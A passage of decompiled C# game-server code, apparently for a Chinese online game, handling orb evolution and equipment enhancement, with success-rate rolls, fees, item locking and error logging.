						}
						else
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex3)
					{
						MainForm.WriteLine(1, "合成系统 宝珠 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex3.Message);
					}
					return;
				case 412:
					try
					{
						if (合成物品表.Count == 0)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
							return;
						}
						HcItimesClass hcItimesClass173 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass173 = 合成物品表[1];
						}
						hcItimesClass173.得到属性();
						hcItimesClass173.强化属性阶段();
						if (!合成物品表.ContainsKey(2))
						{
							if (装备栏包裹[num30].Get物品ID != BitConverter.ToInt32(hcItimesClass173.物品id, 0))
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
								return;
							}
							if (装备栏包裹[num30].物品绑定)
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
								return;
							}
							HcItimesClass hcItimesClass3 = new HcItimesClass();
							hcItimesClass3.位置 = num30;
							hcItimesClass3.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value75 = hcItimesClass3;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(2, value75);
							合成提示(num, 0, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex12)
					{
						MainForm.WriteLine(1, "合成系统 宝珠 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex12.Message);
					}
					return;
				case 413:
					try
					{
						if (合成物品表.Count >= 2 && !合成物品表.ContainsKey(3))
						{
							if (装备栏包裹[num30].物品绑定)
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
							}
							else if (装备栏包裹[num30].Get物品ID == 1008002480)
							{
								HcItimesClass hcItimesClass4 = new HcItimesClass();
								hcItimesClass4.位置 = num30;
								hcItimesClass4.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value177 = hcItimesClass4;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(3, value177);
								合成提示(num, 0, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex84)
					{
						MainForm.WriteLine(1, "合成系统 宝珠 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex84.Message);
					}
					return;
				case 414:
					try
					{
						if (合成物品表.Count <= 0)
						{
							return;
						}
						HcItimesClass hcItimesClass103 = null;
						HcItimesClass hcItimesClass104 = null;
						HcItimesClass hcItimesClass105 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass103 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass104 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass105 = 合成物品表[3];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass103.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass103.物品全局ID, 0))
						{
							合成提示(num, 0, 0, 装备栏包裹[num30]);
							return;
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass104.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass104.物品全局ID, 0))
						{
							合成提示(num, 0, 0, 装备栏包裹[num30]);
							return;
						}
						if (hcItimesClass105 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass105.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass105.物品全局ID, 0))
						{
							合成提示(num, 0, 0, 装备栏包裹[num30]);
							return;
						}
						hcItimesClass103.得到属性();
						hcItimesClass103.强化属性阶段();
						hcItimesClass104.得到属性();
						hcItimesClass104.强化属性阶段();
						if (装备栏包裹[hcItimesClass103.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass103.位置]);
						}
						else
						{
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass103.物品id, 0), out var value149))
							{
								return;
							}
							if (value149.FLD_RESIDE2 != 32 && value149.FLD_RESIDE2 != 33 && value149.FLD_RESIDE2 != 34 && value149.FLD_RESIDE2 != 35 && value149.FLD_RESIDE2 != 36)
							{
								MainForm.WriteLine(6, "合成系统 宝珠 BUG11[" + BitConverter.ToInt32(hcItimesClass103.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass104.物品id, 0) + "]");
								合成提示(num, 0, 0, 装备栏包裹[num30]);
								return;
							}
							if (base.Player_Money < 10000000)
							{
								合成提示(num, 1, 10000000, 装备栏包裹[num30]);
								系统提示("少于1000W无法进化", 50, "");
								return;
							}
							Random random5 = new Random(World.GetRandomSeed());
							double num67 = RNG.Next(0, 100);
							double num68 = RNG.Next(10, 100);
							if (BitConverter.ToInt32(hcItimesClass103.物品id, 0) != BitConverter.ToInt32(hcItimesClass104.物品id, 0))
							{
								合成提示(num, 0, 0, 装备栏包裹[num30]);
								return;
							}
							if (hcItimesClass105 != null)
							{
								int num69 = BitConverter.ToInt32(hcItimesClass105.物品id, 0);
								int num70 = num69;
								if (num70 == 1008002480)
								{
									num67 += 10.0;
								}
							}
							if (World.宝珠进化概率 != 0.0)
							{
								num67 += 100.0 * World.宝珠进化概率;
							}
							if (公有药品.ContainsKey(1008000312))
							{
								num67 += 10.0;
							}
							if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
							{
								num67 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
							}
							if (元宝合成开关 == 1)
							{
								num67 += 5.0;
							}
							int num71 = BitConverter.ToInt32(hcItimesClass103.物品id, 0);
							if (num67 > num68)
							{
								num71 = ((value149.FLD_XW > 115) ? (num71 + 5) : ((value149.FLD_RESIDE2 != 32) ? (num71 + 4) : (num71 + 1)));
								合成提示(num, 0, 10000000, 装备栏包裹[num30]);
								base.Player_Money -= 10000000L;
							}
							else
							{
								合成提示(num, -1, 0, 装备栏包裹[num30]);
							}
							减去物品(hcItimesClass104.位置, 1);
							if (hcItimesClass105 != null)
							{
								减去物品(hcItimesClass105.位置, 1);
							}
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass103.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass103.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass103.物品全局ID, 0))
							{
								减去物品(hcItimesClass103.位置, 1);
								增加物品(hcItimesClass103.物品全局ID, BitConverter.GetBytes(num71), hcItimesClass103.位置, hcItimesClass103.物品数量, hcItimesClass103.物品属性);
							}
							装备栏包裹[hcItimesClass103.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
							return;
						}
					}
					catch (Exception ex67)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 宝珠 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex67.Message);
					}
					return;
				case 10:
				case 244:
					try
					{
						if (合成物品表.Count <= 0 || (base.当前操作类型 != 8 && ((base.当前操作类型 != 209) ? true : false)))
						{
							break;
						}
						HcItimesClass hcItimesClass159 = null;
						HcItimesClass hcItimesClass160 = null;
						HcItimesClass hcItimesClass161 = null;
						HcItimesClass hcItimesClass162 = null;
						HcItimesClass hcItimesClass163 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass159 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass160 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass161 = 合成物品表[3];
						}
						if (合成物品表.ContainsKey(4))
						{
							hcItimesClass162 = 合成物品表[4];
						}
						if (合成物品表.ContainsKey(5))
						{
							hcItimesClass163 = 合成物品表[5];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass159.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass159.物品全局ID, 0))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
							break;
						}
						if (hcItimesClass160 == null)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
							break;
						}
						if (hcItimesClass160 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass160.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass160.物品全局ID, 0)) ? true : false))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass160.位置]);
							合成物品表.Clear();
							break;
						}
						if (hcItimesClass161 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass161.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass161.物品全局ID, 0)) ? true : false))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass161.位置]);
							合成物品表.Clear();
							break;
						}
						if (hcItimesClass162 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass162.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass162.物品全局ID, 0)) ? true : false))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass162.位置]);
							合成物品表.Clear();
							break;
						}
						if (hcItimesClass163 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass163.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass163.物品全局ID, 0)) ? true : false))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass163.位置]);
							合成物品表.Clear();
							break;
						}
						hcItimesClass159.得到属性();
						hcItimesClass159.强化属性阶段();
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass159.物品id, 0), out var value55))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
							break;
						}
						if (value55.FLD_RESIDE2 != 1 && value55.FLD_RESIDE2 != 2 && value55.FLD_RESIDE2 != 4 && value55.FLD_RESIDE2 != 5 && value55.FLD_RESIDE2 != 6 && value55.FLD_RESIDE2 != 14 && value55.FLD_RESIDE2 != 23 && value55.FLD_RESIDE2 != 24 && ((value55.FLD_RESIDE2 != 25) ? true : false))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
							break;
						}
						if (装备栏包裹[hcItimesClass159.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
							break;
						}
						if (value55.FLD_RESIDE2 == 14)
						{
							if (hcItimesClass159.强化数量 >= 10)
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
								合成物品表.Clear();
								return;
							}
							goto IL_1620;
						}
						if (hcItimesClass159.强化数量 < 15)
						{
							goto IL_1620;
						}
						合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
						合成物品表.Clear();
						goto end_IL_10cd;
						IL_1620:
						if (value55.FLD_LEVEL >= 130)
						{
							if (hcItimesClass160 != null && ((BitConverter.ToInt32(hcItimesClass160.物品id, 0) != 800000060) ? true : false))
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
								合成物品表.Clear();
								break;
							}
							if (hcItimesClass161 != null && ((BitConverter.ToInt32(hcItimesClass161.物品id, 0) != 800000060) ? true : false))
							{
								合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
								合成物品表.Clear();
								break;
							}
							if (hcItimesClass162 == null || BitConverter.ToInt32(hcItimesClass162.物品id, 0) == 800000060)
							{
								goto IL_15a6;
							}
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
						}
						else if (hcItimesClass160 != null && ((BitConverter.ToInt32(hcItimesClass160.物品id, 0) != 800000006) ? true : false))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
						}
						else if (hcItimesClass161 != null && ((BitConverter.ToInt32(hcItimesClass161.物品id, 0) != 800000006) ? true : false))
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
						}
						else
						{
							if (hcItimesClass162 == null || BitConverter.ToInt32(hcItimesClass162.物品id, 0) == 800000006)
							{
								goto IL_15a6;
							}
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
						}
						goto end_IL_10cd;
						IL_15a6:
						if (合成手续费 <= 0)
						{
							goto IL_181a;
						}
						if (base.Player_Money < 合成手续费)
						{
							合成提示(11, 4, 0, 装备栏包裹[hcItimesClass159.位置]);
							合成物品表.Clear();
							break;
						}
						base.Player_Money -= 合成手续费;
						更新金钱和负重();
						goto IL_181a;
						IL_181a:
						double num136 = RNG.Next(1, 100);
						if (hcItimesClass163 != null)
						{
							num136 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass163.物品id, 0));
						}
						if (元宝合成开关 == 1)
						{
							num136 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num136 += 100.0 * World.VIP合成率增加百分比;
						}
						if (World.强化率 != 0.0)
						{
							num136 += 100.0 * World.强化率;
						}
						if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
						{
							num136 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
						}
						if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
						{
							num136 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
						}
						if (hcItimesClass159.属性1.属性数量 + hcItimesClass159.属性2.属性数量 != 0 && ((hcItimesClass161 == null) ? true : false))
						{
							系统提示("石头数量不足, 最少需要2颗强化石。");
							break;
						}
						if (hcItimesClass159.属性1.属性数量 + hcItimesClass159.属性2.属性数量 != 0 && hcItimesClass159.属性3.属性数量 + hcItimesClass159.属性4.属性数量 != 0 && ((hcItimesClass162 == null) ? true : false))
						{
							系统提示("石头数量不足, 最少需要3颗强化石。");
							break;
						}
						if (((hcItimesClass159.强化数量 == 0 && num136 >= 100.0 - World.强化一合成率) || (hcItimesClass159.强化数量 == 1 && num136 >= 100.0 - World.强化二合成率) || (hcItimesClass159.强化数量 == 2 && num136 >= 100.0 - World.强化三合成率) || (hcItimesClass159.强化数量 == 3 && num136 >= 100.0 - World.强化四合成率) || (hcItimesClass159.强化数量 == 4 && num136 >= 100.0 - World.强化五合成率) || (hcItimesClass159.强化数量 == 5 && num136 >= 100.0 - World.强化六合成率) || (hcItimesClass159.强化数量 == 6 && num136 >= 100.0 - World.强化七合成率) || (hcItimesClass159.强化数量 == 7 && num136 >= 100.0 - World.强化八合成率) || (hcItimesClass159.强化数量 == 8 && num136 >= 100.0 - World.强化九合成率) || (hcItimesClass159.强化数量 == 9 && num136 >= 100.0 - World.强化十合成率) || (hcItimesClass159.强化数量 == 10 && num136 >= 100.0 - World.强化十一合成率) || (hcItimesClass159.强化数量 == 11 && num136 >= 100.0 - World.强化十二合成率) || (hcItimesClass159.强化数量 == 12 && num136 >= 100.0 - World.强化十三合成率) || (hcItimesClass159.强化数量 == 13 && num136 >= 100.0 - World.强化十四合成率) || (hcItimesClass159.强化数量 == 14 && num136 >= 100.0 - World.强化十五合成率)) ? true : false)
						{
							hcItimesClass159.强化类型 = ((value55.FLD_RESIDE2 == 4) ? 1 : 2);
							hcItimesClass159.强化数量++;
							if (hcItimesClass159.强化数量 >= 15)
							{
								hcItimesClass159.强化数量 = 15;
							}
							hcItimesClass159.设置阶段属性();
							if (hcItimesClass159.强化数量 >= int.Parse(World.强化数量大于发送快报[0]))
							{
								发送快报(base.UserName, hcItimesClass159.强化数量, hcItimesClass159.物品id, base.Player_Zx);
							}
							if (BitConverter.ToInt32(装备栏包裹[hcItimesClass159.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass159.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass159.物品全局ID, 0)) ? true : false))
							{
								减去物品(hcItimesClass159.位置, 1);
								增加物品(hcItimesClass159.物品全局ID, hcItimesClass159.物品id, hcItimesClass159.位置, hcItimesClass159.物品数量, hcItimesClass159.物品属性);
							}
							装备栏包裹[hcItimesClass159.位置].锁定 = false;
							RxjhClass.合成记录(base.Userid, base.UserName, value55.ItmeNAME, num, "强化", "成功", 装备栏包裹[hcItimesClass159.位置]);
							合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass159.位置]);
						}
						else
						{
							bool flag5 = false;
							foreach (英雄职业武器 value96 in World.英雄职业武器系统.Values)
							{
								if (BitConverter.ToInt32(装备栏包裹[hcItimesClass159.位置].物品ID, 0) == value96.装备ID)
								{
									flag5 = true;
									break;
								}
							}
							if (flag5)
							{
								合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass159.位置]);
								减去物品(hcItimesClass159.位置, 1);
							}
							else
							{
								if (value55.FLD_RESIDE2 == 1 || value55.FLD_RESIDE2 == 2 || value55.FLD_RESIDE2 == 5 || ((value55.FLD_RESIDE2 == 6) ? true : false))
								{
									int value56 = RNG.Next(7, 10);
									int num137 = 得到包裹空位(this);
									if (num137 != -1)
									{
										if (value55.FLD_LEVEL >= 140 && ((value55.FLD_LEVEL < 150) ? true : false))
										{
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000766), num137, BitConverter.GetBytes(value56), new byte[56]);
										}
										else if (value55.FLD_LEVEL >= 130 && ((value55.FLD_LEVEL < 140) ? true : false))
										{
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000765), num137, BitConverter.GetBytes(value56), new byte[56]);
										}
										else if (value55.FLD_LEVEL >= 120 && ((value55.FLD_LEVEL < 130) ? true : false))
										{
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000764), num137, BitConverter.GetBytes(value56), new byte[56]);
										}
										else if (value55.FLD_LEVEL >= 115 && ((value55.FLD_LEVEL < 120) ? true : false))
										{
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000763), num137, BitConverter.GetBytes(value56), new byte[56]);
										}
										else if (value55.FLD_LEVEL >= 100 && ((value55.FLD_LEVEL < 115) ? true : false))
										{
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000744), num137, BitConverter.GetBytes(value56), new byte[56]);
										}
										else if (value55.FLD_LEVEL >= 80 && ((value55.FLD_LEVEL < 99) ? true : false))
										{
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000743), num137, BitConverter.GetBytes(value56), new byte[56]);
										}
										else if (value55.FLD_LEVEL >= 60 && ((value55.FLD_LEVEL < 79) ? true : false))
										{
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000742), num137, BitConverter.GetBytes(value56), new byte[56]);
										}
										else if (value55.FLD_LEVEL >= 40 && ((value55.FLD_LEVEL < 59) ? true : false))
										{
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000741), num137, BitConverter.GetBytes(value56), new byte[56]);
										}
									}
								}
								else if (value55.FLD_RESIDE2 == 4)
								{
									int num3 = 得到包裹空位(this);
									if (num3 != -1)
									{
										switch (value55.FLD_JOB_LEVEL)
										{
										case 2:
										{
											int value65 = RNG.Next(7, 12);
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000729), num3, BitConverter.GetBytes(value65), new byte[56]);
											break;
										}
										case 3:
										{
											int value64 = RNG.Next(7, 11);
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000730), num3, BitConverter.GetBytes(value64), new byte[56]);
											break;
										}
										case 4:
										{
											int value63 = RNG.Next(7, 11);
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000731), num3, BitConverter.GetBytes(value63), new byte[56]);
											break;
										}
										case 5:
										{
											int value62 = RNG.Next(7, 11);
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000732), num3, BitConverter.GetBytes(value62), new byte[56]);
											break;
										}
										case 6:
										{
											int value61 = RNG.Next(7, 11);
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000759), num3, BitConverter.GetBytes(value61), new byte[56]);
											break;
										}
										case 7:
										{
											int value60 = RNG.Next(7, 11);
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000760), num3, BitConverter.GetBytes(value60), new byte[56]);
											break;
										}
										case 8:
										{
											int value59 = RNG.Next(7, 11);
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000761), num3, BitConverter.GetBytes(value59), new byte[56]);
											break;
										}
										case 9:
										{
											int value58 = RNG.Next(7, 11);
											增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000762), num3, BitConverter.GetBytes(value58), new byte[56]);
											break;
										}
										}
									}
								}
								合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass159.位置]);
								RxjhClass.合成记录(base.Userid, base.UserName, value55.ItmeNAME, num, "强化", "失败", 装备栏包裹[hcItimesClass159.位置]);
								减去物品(hcItimesClass159.位置, 1);
							}
						}
						减去物品(hcItimesClass160.位置, 1);
						if (hcItimesClass161 != null)
						{
							减去物品(hcItimesClass161.位置, 1);
						}
						if (hcItimesClass162 != null)
						{
							减去物品(hcItimesClass162.位置, 1);
						}
						if (hcItimesClass163 != null)
						{
							减去物品(hcItimesClass163.位置, 1);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						合成手续费 = 0;
						end_IL_10cd:;
					}
					catch (Exception ex5)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 强化合成 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex5.Message);
					}
					break;
				case 11:
				case 241:
					try
					{
						if ((base.当前操作类型 != 8 && base.当前操作类型 != 209) || (合成物品表.ContainsKey(1) ? true : false))
						{
							break;
						}
						ItmeClass value71;
						if (装备栏包裹[num30].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[num30]);
						}
						else if (World.Itme.TryGetValue((int)装备栏包裹[num30].Get物品ID, out value71))
						{
							if (value71.FLD_RESIDE2 != 1 && value71.FLD_RESIDE2 != 2 && value71.FLD_RESIDE2 != 4 && value71.FLD_RESIDE2 != 5 && value71.FLD_RESIDE2 != 6 && value71.FLD_RESIDE2 != 14)
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								return;
							}
							if (value71.FLD_RESIDE2 == 14 && 装备栏包裹[num30].FLD_强化数量 >= 10)
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
								return;
							}
							if (装备栏包裹[num30].FLD_强化数量 < 15)
							{
								int 钱数4 = (合成手续费 = 计算合成强化费用(value71, num30, num));
								HcItimesClass hcItimesClass31 = new HcItimesClass();
								hcItimesClass31.位置 = num30;
								hcItimesClass31.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value72 = hcItimesClass31;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(1, value72);
								合成提示(num, 1, 钱数4, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex9)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex9.Message);
					}
					break;
				case 12:
				case 242:
					try
					{
						if ((base.当前操作类型 != 8 && base.当前操作类型 != 209) || (合成物品表.ContainsKey(4) ? true : false))
						{
							break;
						}
						HcItimesClass hcItimesClass106;
						if (合成物品表.Count == 0)
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else
						{
							if (合成物品表.ContainsKey(1))
							{
								hcItimesClass106 = 合成物品表[1];
								ItmeClass value151 = new ItmeClass();
								if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 1 || ((!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass106.物品id, 0), out value151)) ? true : false))
								{
									break;
								}
								if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 800000006 && ((BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 800000060) ? true : false))
								{
									合成提示(num, 7, 0, 装备栏包裹[num30]);
								}
								else if (value151.FLD_LEVEL >= 0 && ((value151.FLD_LEVEL < 130) ? true : false))
								{
									if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == 800000006)
									{
										goto IL_285f;
									}
									合成提示(num, 5, 0, 装备栏包裹[num30]);
								}
								else
								{
									if (value151.FLD_LEVEL < 130 || BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) == 800000060)
									{
										goto IL_285f;
									}
									合成提示(num, 5, 0, 装备栏包裹[num30]);
								}
								break;
							}
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						goto end_IL_266d;
						IL_285f:
						if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 800000006 && ((BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 800000060) ? true : false))
						{
							合成提示(num, 7, 0, 装备栏包裹[num30]);
							break;
						}
						HcItimesClass hcItimesClass30 = new HcItimesClass();
						hcItimesClass30.位置 = num30;
						hcItimesClass30.物品 = 装备栏包裹[num30].物品_byte;
						HcItimesClass value152 = hcItimesClass30;
						装备栏包裹[num30].锁定 = true;
						if (!合成物品表.ContainsKey(2))
						{
							合成物品表.TryAdd(2, value152);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
						hcItimesClass106.得到属性();
						if (hcItimesClass106.属性1.属性数量 + hcItimesClass106.属性2.属性数量 == 0)
						{
							goto IL_29b4;
						}
						if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) >= 2)
						{
							if (!合成物品表.ContainsKey(3))
							{
								合成物品表.TryAdd(3, value152);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
							goto IL_29b4;
						}
						goto end_IL_266d;
						IL_29b4:
						if (hcItimesClass106.属性1.属性数量 + hcItimesClass106.属性2.属性数量 != 0 && hcItimesClass106.属性3.属性数量 + hcItimesClass106.属性4.属性数量 != 0 && BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) >= 3 && !合成物品表.ContainsKey(4))
						{
							合成物品表.TryAdd(4, value152);
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
						end_IL_266d:;
					}
					catch (Exception ex70)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex70.Message);
					}
					break;
				case 13:
				case 243:
					try
					{
						if (base.当前操作类型 == 8 || base.当前操作类型 == 209)
						{
							if (合成物品表.Count == 0)
							{
								合成提示(num, 5, 0, 装备栏包裹[num30]);
							}
							else if (!合成物品表.ContainsKey(5))
							{
								HcItimesClass hcItimesClass29 = new HcItimesClass();
								hcItimesClass29.位置 = num30;
								hcItimesClass29.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value78 = hcItimesClass29;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(5, value78);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex15)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex15.Message);
					}
					break;
				case 19:
				case 240:
					try
					{
						if (合成物品表.TryGetValue(1, out var value46))
						{
							装备栏包裹[value46.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value46.位置]);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
					}
					catch (Exception ex2)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
					}
					break;
				case 20:
					try
					{
						if (base.当前操作类型 != 6 || ((合成物品表.Count <= 0) ? true : false))
						{
							break;
						}
						HcItimesClass hcItimesClass169 = null;
						HcItimesClass hcItimesClass170 = null;
						HcItimesClass hcItimesClass171 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass169 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass170 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass171 = 合成物品表[3];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass169.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass169.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass170.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass170.物品全局ID, 0) || (hcItimesClass171 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass171.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass171.物品全局ID, 0)) ? true : false)))
						{
							break;
						}
						hcItimesClass169.得到属性();
						hcItimesClass169.强化属性阶段();
						hcItimesClass170.强化属性阶段();
						ItmeClass value74;
						if (装备栏包裹[hcItimesClass169.位置].物品绑定)
						{
							合成提示(21, 3, 0, 装备栏包裹[hcItimesClass169.位置]);
							合成物品表.Clear();
						}
						else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass169.物品id, 0), out value74))
						{
							if (value74.FLD_RESIDE2 != 1 && value74.FLD_RESIDE2 != 2 && value74.FLD_RESIDE2 != 4 && value74.FLD_RESIDE2 != 5 && value74.FLD_RESIDE2 != 6 && ((value74.FLD_RESIDE2 != 12) ? true : false))
							{
								合成提示(21, 5, 0, 装备栏包裹[hcItimesClass169.位置]);
								合成物品表.Clear();
								break;
							}
							if (value74.FLD_RESIDE2 == 12)
							{
								if (BitConverter.ToInt32(hcItimesClass170.物品id, 0) != 800000013)
								{
									合成提示(21, 5, 0, 装备栏包裹[hcItimesClass169.位置]);
									合成物品表.Clear();
